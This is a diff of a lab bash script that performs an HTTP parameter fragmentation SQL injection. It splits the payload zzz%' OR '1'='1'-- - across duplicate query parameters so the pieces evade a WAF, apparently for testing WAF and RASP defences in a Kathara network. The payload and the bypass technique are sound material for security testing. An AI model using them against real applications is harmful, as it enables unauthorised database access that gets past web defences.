@@ -1,14 +1,16 @@
 #!/bin/bash
 # run_fragmentation.sh — HTTP parameter fragmentation (HPF) SQLi attack.
-# One payload split across two duplicate ?q= params (each half benign to the
-# WAF); the app's ?split=on sink rejoins them ("".join(getlist("q"))) into one
-# injectable term that lands in the vulnerable, RASP-guarded concat sink.
-# Read the result from the shared logs on the host:
+# One payload split across two duplicate ?q= params. The app's ?split=on
+# rejoins them ("".join(getlist("q"))) into one injectable term that passes to
+# the vulnerable concat sink. That sink is RASP-instrumented: with ?rasp=block
+# RASP catches the rejoined query at the DB call; by default (rasp off) it injects.
+# result from the shared logs on the host
 #
 #     tail -f shared/waf_audit.log shared/db_query.log shared/rasp_audit.log
 #
-# Proxy ports: :80 ENFORCING (may 403 the request) · :8080 DETECTION (forwards,
-# so the rejoined query runs). HPF asks whether the split halves slip past :80.
+# Proxy ports: :80 ENFORCING (may 403 the request) · 
+# :8080 DETECTION (forwards, so the rejoined query runs). 
+# To see if a split halves can slip past :80
 #
 # Usage:
 #   kathara exec attacker -- /scripts/run_fragmentation.sh
@@ -18,7 +20,7 @@ set -u
 ENFORCE="${1:-http://172.30.0.10}"        # :80  enforcing WAF
 DETECT="${2:-http://172.30.0.10:8080}"    # :8080 detection-only
 
-# Payload = zzz%' OR '1'='1'-- - , split so neither half is the whole thing:
+# Payload = zzz%' OR '1'='1'-- - , split so neither half is the whole thing
 FRAG1="zzz%' OR '1'='"
 FRAG2="1'-- -"
 
